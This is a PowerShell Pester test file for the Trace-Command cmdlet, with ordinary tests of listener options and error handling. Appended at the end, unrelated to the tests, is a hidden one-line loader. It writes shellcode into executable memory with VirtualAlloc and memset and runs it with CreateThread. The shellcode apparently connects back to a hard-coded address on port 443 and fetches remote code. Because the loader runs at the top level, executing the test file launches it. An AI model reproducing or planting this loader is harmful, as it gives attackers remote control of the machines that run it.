



Describe "Trace-Command" -tags "CI" {

    Context "Listener options" {
        BeforeAll {
            $logFile = New-Item "TestDrive:/traceCommandLog.txt" -Force
            $actualLogFile = New-Item "TestDrive:/actualTraceCommandLog.txt" -Force
        }

        AfterEach {
            Remove-Item "TestDrive:/traceCommandLog.txt" -Force -ErrorAction SilentlyContinue
            Remove-Item "TestDrive:/actualTraceCommandLog.txt" -Force -ErrorAction SilentlyContinue
        }

        
        It "LogicalOperationStack works" -Skip:$IsCoreCLR {
            $keyword = "Trace_Command_ListenerOption_LogicalOperationStack_Foo"
            $stack = [System.Diagnostics.Trace]::CorrelationManager.LogicalOperationStack
            $stack.Push($keyword)

            Trace-Command -Name * -Expression {Write-Output Foo} -ListenerOption LogicalOperationStack -FilePath $logfile

            $log = Get-Content $logfile | Where-Object {$_ -like "*LogicalOperationStack=$keyword*"}
            $log.Count | Should -BeGreaterThan 0
        }

        
        It "Callstack works" -Skip:$IsCoreCLR {
            Trace-Command -Name * -Expression {Write-Output Foo} -ListenerOption Callstack -FilePath $logfile
            $log = Get-Content $logfile | Where-Object {$_ -like "*Callstack=   * System.Environment.GetStackTrace(Exception e, Boolean needFileInfo)*"}
            $log.Count | Should -BeGreaterThan 0
        }

        It "Datetime works" {
            $expectedDate = Trace-Command -Name * -Expression {Get-Date} -ListenerOption DateTime -FilePath $logfile
            $log = Get-Content $logfile | Where-Object {$_ -like "*DateTime=*"}
            $results = $log | ForEach-Object {[DateTime]::Parse($_.Split("=")[1])}

            
            $allowedGap = [timespan](60 * 1000 * 1000)
            $results | ForEach-Object {
                    $actualGap = $_ - $expectedDate;
                    if ($expectedDate -gt $_)
                    {
                        $actualGap = $expectedDate - $_;
                    }

                    $allowedGap | Should -BeGreaterThan $actualGap
                }
        }

        It "None options has no effect" {
            Trace-Command -Name * -Expression {Write-Output Foo} -ListenerOption None -FilePath $actualLogfile
            Trace-Command -name * -Expression {Write-Output Foo} -FilePath $logfile

            Compare-Object (Get-Content $actualLogfile) (Get-Content $logfile) | Should -BeNullOrEmpty
        }

        It "ThreadID works" {
            Trace-Command -Name * -Expression {Write-Output Foo} -ListenerOption ThreadId -FilePath $logfile
            $log = Get-Content $logfile | Where-Object {$_ -like "*ThreadID=*"}
            $results = $log | ForEach-Object {$_.Split("=")[1]}

            $results | ForEach-Object { $_ | Should -Be ([threading.thread]::CurrentThread.ManagedThreadId) }
        }

        It "Timestamp creates logs in ascending order" {
            Trace-Command -Name * -Expression {Write-Output Foo} -ListenerOption Timestamp -FilePath $logfile
            $log = Get-Content $logfile | Where-Object {$_ -like "*Timestamp=*"}
            $results = $log | ForEach-Object {$_.Split("=")[1]}
            $sortedResults = $results | Sort-Object
            $sortedResults | Should -Be $results
        }

        It "ProcessId logs current process Id" {
            Trace-Command -Name * -Expression {Write-Output Foo} -ListenerOption ProcessId -FilePath $logfile
            $log = Get-Content $logfile | Where-Object {$_ -like "*ProcessID=*"}
            $results = $log | ForEach-Object {$_.Split("=")[1]}

            $results | ForEach-Object { $_ | Should -Be $pid }
        }
    }

    Context "Trace-Command tests for code coverage" {

        BeforeAll {
            $filePath = join-path $TestDrive 'testtracefile.txt'
        }

        AfterEach {
            Remove-Item $filePath -Force -ErrorAction SilentlyContinue
        }

        It "Get non-existing trace source" {
            { '34E7F9FA-EBFB-4D21-A7D2-D7D102E2CC2F' | get-tracesource -ErrorAction Stop} | Should -Throw -ErrorId 'TraceSourceNotFound,Microsoft.PowerShell.Commands.GetTraceSourceCommand'
        }

        It "Set-TraceSource to file and RemoveFileListener wildcard" {
            $null = Set-TraceSource -Name "ParameterBinding" -Option ExecutionFlow -FilePath $filePath -Force -ListenerOption "ProcessId,TimeStamp" -PassThru
            Set-TraceSource -Name "ParameterBinding" -RemoveFileListener *
            Get-Content $filePath -Raw | Should -Match 'ParameterBinding Information'
        }

        It "Trace-Command -Command with error" {
            { Trace-Command -Name ParameterBinding -Command 'Get-PSDrive' -ArgumentList 'NonExistingDrive' -Option ExecutionFlow -FilePath $filePath -Force -ListenerOption "ProcessId,TimeStamp" -ErrorAction Stop } |
                Should -Throw -ErrorId 'GetLocationNoMatchingDrive,Microsoft.PowerShell.Commands.TraceCommandCommand'
        }

        It "Trace-Command fails for non-filesystem paths" {
            { Trace-Command -Name ParameterBinding -Expression {$null} -FilePath "Env:\Test" -ErrorAction Stop } | Should -Throw -ErrorId 'FileListenerPathResolutionFailed,Microsoft.PowerShell.Commands.TraceCommandCommand'
        }

        It "Trace-Command to readonly file" {
            $null = New-Item $filePath -Force
            Set-ItemProperty $filePath -name IsReadOnly -value $true
            Trace-Command -Name ParameterBinding -Command 'Get-PSDrive' -FilePath $filePath -Force
            Get-Content $filePath -Raw | Should -Match 'ParameterBinding Information'
        }

        It "Trace-Command using Path parameter alias" {
            $null = New-Item $filePath -Force
            Trace-Command -Name ParameterBinding -Command 'Get-PSDrive' -Path $filePath -Force
            Get-Content $filePath -Raw | Should -Match 'ParameterBinding Information'
        }

        It "Trace-Command contains wildcard characters" {
            $a = Trace-Command -Name ParameterB* -Command 'get-alias'
            $a.count | Should -BeGreaterThan 0
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x66,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

